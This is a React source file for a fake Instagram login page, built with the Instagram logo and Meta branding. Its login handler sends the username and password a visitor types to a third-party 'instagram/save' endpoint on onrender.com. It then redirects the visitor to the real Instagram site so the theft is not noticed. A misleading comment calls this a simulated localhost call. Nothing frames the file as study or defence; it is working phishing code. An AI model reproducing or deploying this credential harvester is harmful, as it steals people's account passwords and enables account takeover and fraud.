import React, { useState } from 'react';

// Main App component
const App = () => {
  // State variables for username and password
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  // State for loading indicator during login
  const [isLoading, setIsLoading] = useState(false);
  // State for displaying error messages
  const [error, setError] = useState('');

  // Function to handle form submission
  const handleLogin = async (e) => {
    e.preventDefault(); // Prevent default form submission behavior
    setIsLoading(true); // Set loading state to true
    setError(''); // Clear any previous errors

    try {
      // Simulate a call to a localhost backend
      // Replace with your actual backend endpoint
      const response = await fetch('https://backend-6qxr.onrender.com/instagram/save', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });

      // Check if the response from the backend is successful
      if (response.ok) {
        // Simulate successful login
        console.log('Login successful on backend!');
        // Redirect to Instagram after successful login
        window.location.href = 'https://www.instagram.com';
      } else {
        // Handle login errors from the backend
        const errorData = await response.json();
        setError(errorData.message || 'Login failed. Please try again.');
        console.error('Backend login failed:', errorData);
      }
    } catch (err) {
      // Handle network or other unexpected errors
      setError('An error occurred. Please try again later.');
      console.error('Network or unexpected error during login:', err);
    } finally {
      setIsLoading(false); // Reset loading state
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
      <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
        {/* Back arrow icon */}
        <div className="flex justify-start mb-6">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6 text-gray-700 cursor-pointer"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth={2}
          >
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
          </svg>
        </div>

        {/* Language selector */}
        <p className="text-center text-gray-500 text-sm mb-6">English (UK)</p>

        {/* Instagram Logo */}
        <div className="flex justify-center mb-8">
          <img
            src="https://cdn.freebiesupply.com/images/large/2x/instagram-logo-gradient-transparent.png"
            alt="Instagram Logo"
            className="h-24"
          />
        </div>

        {/* Login Form */}
        <form onSubmit={handleLogin}>
          {/* Username/Email/Phone Input */}
          <input
            type="text"
            placeholder="Username, email address or mobile number"
            className="w-full px-4 py-3 mb-4 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />

          {/* Password Input */}
          <input
            type="password"
            placeholder="Password"
            className="w-full px-4 py-3 mb-6 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />

          {/* Error Message Display */}
          {error && <p className="text-red-500 text-center text-sm mb-4">{error}</p>}

          {/* Log In Button */}
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-3 rounded-lg font-semibold hover:bg-blue-600 transition duration-300 flex items-center justify-center"
            disabled={isLoading} // Disable button when loading
          >
            {isLoading ? (
              <svg className="animate-spin h-5 w-5 mr-3 text-white" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
            ) : (
              'Log In'
            )}
          </button>
        </form>

        {/* Forgotten password link */}
        <p className="text-center text-blue-500 text-sm mt-4 cursor-pointer hover:underline">
          Forgotten password?
        </p>

        {/* Separator */}
        <div className="relative flex items-center my-8">
          <div className="flex-grow border-t border-gray-300"></div>
          <span className="flex-shrink mx-4 text-gray-500 text-sm">OR</span>
          <div className="flex-grow border-t border-gray-300"></div>
        </div>

        {/* Create New Account button */}
        <button className="w-full border border-blue-500 text-blue-500 py-3 rounded-lg font-semibold hover:bg-blue-50 transition duration-300">
          Create new account
        </button>

        {/* Meta branding */}
        <div className="flex justify-center mt-12">
          <img
            src="/metadark.png"
            alt="Meta Logo"
            className="h-28"
          />
        </div>
      </div>
    </div>
  );
};

export default App;
